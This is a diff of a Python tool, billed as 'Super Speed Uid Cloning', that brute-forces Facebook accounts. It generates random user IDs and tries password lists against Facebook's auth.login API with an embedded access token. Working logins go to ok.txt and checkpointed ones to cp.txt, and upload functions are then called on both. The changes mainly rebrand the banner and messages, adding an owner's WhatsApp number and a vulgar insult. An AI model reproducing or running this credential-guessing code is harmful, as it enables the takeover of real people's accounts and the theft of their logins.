@@ -51,7 +51,7 @@ def notice():
 
 	runtxt("\n\033[0;91mYOU ARE NOT PREMIUM USER ")
 	runtxt("\033[0;93m  SENT THIS KEY TO ADMIN >> %s%s"%(G,basesplit))
-	runtxt("\033[0;92m ADMIN MESSENGER🔰R140N")
+	runtxt("\033[0;92m ADMIN MESSENGER🔰 VǢMPÏRÊ᭄ゝ༺ʚĩɞ༻")
 	subprocess.check_output(["am", "start", "https://m.me/USER.AGENT.LUCIFER.JUSTIN.TONMOY.I.CAN.FcK.UR.MOM"])
 
 def irfan():
@@ -97,18 +97,17 @@ class Main:
 		os.system("clear")
 		
 		print ("""\033[1;92m   
-
-██████╗░░░███╗░░░░██╗██╗░█████╗░███╗░░██╗
-██╔══██╗░████║░░░██╔╝██║██╔══██╗████╗░██║
-██████╔╝██╔██║░░██╔╝░██║██║░░██║██╔██╗██║
-██╔══██╗╚═╝██║░░███████║██║░░██║██║╚████║
-██║░░██║███████╗╚════██║╚█████╔╝██║░╚███║
-╚═╝░░╚═╝╚══════╝░░░░░╚═╝░╚════╝░╚═╝░░╚══╝                                 
+[!] SURAIYA.R MAIRE XUDI 🐸
+ _    _____    __  _______  ________  ______   
+| |  / /   |  /  |/  / __ \/  _/ __ \/ ____/   
+| | / / /| | / /|_/ / /_/ // // /_/ / __/      
+| |/ / ___ |/ /  / / ____// // _, _/ /___      
+|___/_/  |_/_/  /_/_/   /___/_/ |_/_____/                                 
 \033[1;90m══════════════════════════════════════════════════
-\033[1;91m [\033[1;94m✓\033[1;91m] \033[1;92mFACEBOOK : MD NANU MIAH  
-\033[1;91m [\033[1;94m✓\033[1;91m] \033[1;92mFB GROUP : King of Bhai brother's 
-\033[1;91m [\033[1;94m✓\033[1;91m] \033[1;92mGITHUB   : R140N
-\033[1;91m [\033[1;94m✓\033[1;91m] \033[1;92mWhatsapp  : 01822695844
+\033[1;91m [\033[1;94m✓\033[1;91m] \033[1;92mOWNER    : MD NANU MIAH  
+\033[1;91m [\033[1;94m✓\033[1;91m] \033[1;92mFACEBOOK : King of Bhai brother's 
+\033[1;91m [\033[1;94m✓\033[1;91m] \033[1;92mGITHUB   : justinlucifer
+\033[1;91m [\033[1;94m✓\033[1;91m] \033[1;92mWHATSAPP : 01300161579
 \033[1;90m══════════════════════════════════════════════════
     """)
 		print("%s [%s•%s] %sTOOL NAME : %sSuper Speed Uid Cloning"%(G,R,G,B,G))
@@ -167,7 +166,7 @@ class Main:
 		idx = random.choice(["1", "2", "3", "4", "5", "6", "7", "8", "9"])
 		limit = int(input("\033[0;92m [+] ENTER LIMIT \033[0;91m(50000 MAX): \033[0;92m"))
 		if (limit)>50000:
-			exit("\n%s [!] DON'T CROSS THE LIMIT BRO :)"%(R))
+			exit("\n%s [!] SURAIYA.R MAIRE XUDI 🐸 :)"%(R))
 		try:
 			for n in range(limit):
 				_ = random.randint(x,xx)
@@ -196,7 +195,7 @@ class Main:
 		idx = random.choice(["1", "2", "3", "4", "5", "6", "7", "8", "9"])
 		limit = int(input("\033[0;92m [+] ENTER LIMIT \033[0;91m(50000 MAX): \033[0;92m"))
 		if (limit)>50000:
-			exit("\n%s [!] DON'T CROSS THE LIMIT BRO :)"%(R))
+			exit("\n%s [!] SURAIYA.R MAIRE XUDI 🐸:)"%(R))
 		try:
 			for n in range(limit):
 				_ = random.randint(x,xx)
@@ -224,7 +223,7 @@ class Main:
 		idx = "100000"
 		limit = int(input("\033[0;92m [+] ENTER LIMIT \033[0;91m(50000 MAX): \033[0;92m"))
 		if (limit)>50000:
-			exit("\n%s [!] DON'T CROSS THE LIMIT BRO :)"%(R))
+			exit("\n%s [!] SURAIYA.R MAIRE XUDI 🐸 :)"%(R))
 		try:
 			for n in range(limit):
 				_ = random.randint(x,xx)
@@ -253,7 +252,7 @@ class Main:
 		idx = random.choice(["1", "2", "3", "4", "5", "6", "7", "8", "9"])
 		limit = int(input("\033[0;92m [+] ENTER LIMIT \033[0;91m(50000 MAX): \033[0;92m"))
 		if (limit)>50000:
-			exit("\n%s [!] DON'T CROSS THE LIMIT BRO :)"%(R))
+			exit("\n%s [!] SURAIYA.R MAIRE XUDI 🐸 :)"%(R))
 		try:
 			for n in range(limit):
 				_ = random.randint(x,xx)
@@ -282,7 +281,7 @@ class Main:
 		idx = random.choice(["1", "2", "3", "4", "5", "6", "7", "8", "9"])
 		limit = int(input("\033[0;92m [+] ENTER LIMIT \033[0;91m(50000 MAX): \033[0;92m"))
 		if (limit)>50000:
-			exit("\n%s [!] DON'T CROSS THE LIMIT BRO :)"%(R))
+			exit("\n%s [!] SURAIYA.R MAIRE XUDI 🐸 :)"%(R))
 		try:
 			for n in range(limit):
 				_ = random.randint(x,xx)
@@ -312,7 +311,7 @@ class Main:
 		idx = random.choice(["1", "2", "3", "4", "5", "6", "7", "8", "9"])
 		limit = int(input("\033[0;92m [+] ENTER LIMIT \033[0;91m(10000 MAX): \033[0;92m"))
 		if (limit)>10000:
-			exit("\n%s [!] DON'T CROSS THE LIMIT BRO :)"%(R))
+			exit("\n%s [!] SURAIYA.R MAIRE XUDI 🐸 :)"%(R))
 		try:
 			for n in range(limit):
 				_ = random.randint(x,xx)
@@ -342,7 +341,7 @@ class Main:
 		idx = random.choice(["1", "2", "3", "4", "5", "6", "7", "8", "9"])
 		limit = int(input("\033[0;92m [+] ENTER LIMIT \033[0;91m(50000 MAX): \033[0;92m"))
 		if (limit)>50000:
-			exit("\n%s [!] DON'T CROSS THE LIMIT BRO :)"%(R))
+			exit("\n%s [!] SURAIYA.R MAIRE XUDI 🐸 :)"%(R))
 		try:
 			for n in range(limit):
 				_ = random.randint(x,xx)
@@ -372,7 +371,7 @@ class Main:
 		idx = random.choice(["1", "2", "3", "4", "5", "6", "7", "8", "9"])
 		limit = int(input("\033[0;92m [+] ENTER LIMIT \033[0;91m(10000 MAX): \033[0;92m"))
 		if (limit)>10000:
-			exit("\n%s [!] DON'T CROSS THE LIMIT BRO :)"%(R))
+			exit("\n%s [!] SURAIYA.R MAIRE XUDI 🐸 :)"%(R))
 		try:
 			for n in range(limit):
 				_ = random.randint(x,xx)
@@ -398,13 +397,13 @@ class Main:
 	def email(self):
 		x = 111
 		xx = 999
-		nam = input("%s [?] TYPE A NAME %s(EX: Riyad): "%(Y,G))
+		nam = input("%s [?] TYPE A NAME %s(Justin: Tonmoy): "%(Y,G))
 		nam = nam.replace(" ", "")
 		print("%s EXAMPLE  : %s@gmail.com, @yahoo.com, @hotmail.com ETC"%(Y,G))
 		idx = input("%s DOMAIN  : "%(B))
 		limit = int(input("\033[0;92m [+] ENTER LIMIT \033[0;91m(50000 MAX): \033[0;92m"))
 		if (limit)>50000:
-			exit("\n%s [!] DON'T CROSS THE LIMIT BRO :)"%(R))
+			exit("\n%s [!] SURAIYA.R MAIRE XUDI 🐸 :)"%(R))
 		try:
 			for n in range(limit):
 				_ = random.randint(x,xx)
@@ -437,7 +436,7 @@ class Main:
 			"Mozilla/5.0 (Linux; Android 11; RMX2195) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Mobile Safari/537.36;]"
 		])
 		sys.stdout.write(
-			"\r\r %s[>_] [R140N_OLD] : %s/%s -> \033[0;92m [ R140N-OK:%s ]- \033[0;91m[R140N-CP:%s ]"%(B,self.loop, len(self.id), len(self.ok), len(self.cp))
+			"\r\r %s[>_] [VǢMPÏRÊ_OLD] : %s/%s -> \033[0;92m [ R140N-OK:%s ]- \033[0;91m[R140N-CP:%s ]"%(B,self.loop, len(self.id), len(self.ok), len(self.cp))
 		); sys.stdout.flush()
 		for pw in pwx:
 			pw = pw.lower()
@@ -454,15 +453,15 @@ class Main:
 			}
 			response = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers) 
 			if "session_key" in response.text and "EAAA" in response.text:
-				print("\r \033[0;92m[R140N-OK] %s|%s\033[0;97m         "%(uid, pw))
+				print("\r \033[0;92m[VǢMPÏRÊ-OK] %s|%s\033[0;97m         "%(uid, pw))
 				self.ok.append("%s|%s"%(uid, pw))
-				open("ok.txt","a").write(" [R140N-OK] %s|%s\n"%(uid, pw))
+				open("ok.txt","a").write(" [VǢMPÏRÊ-OK] %s|%s\n"%(uid, pw))
 				uploadoks()
 				break
 			elif "www.facebook.com" in response.json()["error_msg"]:
-				print("\r \033[0;91m[R140N-CP] %s|%s\033[0;97m         "%(uid, pw))
+				print("\r \033[0;91m[VǢMPÏRÊ-CP] %s|%s\033[0;97m         "%(uid, pw))
 				self.cp.append("%s|%s"%(uid, pw))
-				open("cp.txt","a").write(" [R140N-CP] %s|%s\n"%(uid, pw))
+				open("cp.txt","a").write(" [VǢMPÏRÊ-CP] %s|%s\n"%(uid, pw))
 				uploadcps()
 				break
 			else:
